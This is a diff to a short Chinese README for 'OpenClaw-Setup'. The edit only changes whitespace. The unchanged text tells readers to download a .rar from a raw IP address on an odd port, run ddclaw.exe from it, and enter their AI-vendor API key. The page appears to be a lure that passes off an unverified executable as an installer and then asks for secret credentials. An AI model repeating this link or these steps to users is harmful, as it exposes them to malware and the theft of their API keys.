@@ -1,5 +1,5 @@
 # OpenClaw-Setup
-                                                                        使用说明
+                                                          使用说明
 首先下载这个压缩包：网址是: https://119.29.196.58:11281/down/ALVVnRjOfzQw.rar，下载之后，就解压到任何的文件夹内，再双击打开这个文件夹openclaw-setup，找到ddclaw.exe，再双击打开，
 打开之后，会提示你是否要配置你在大模型厂商获得的API Key，你必须要先配置API Key，否则无法使用。
 
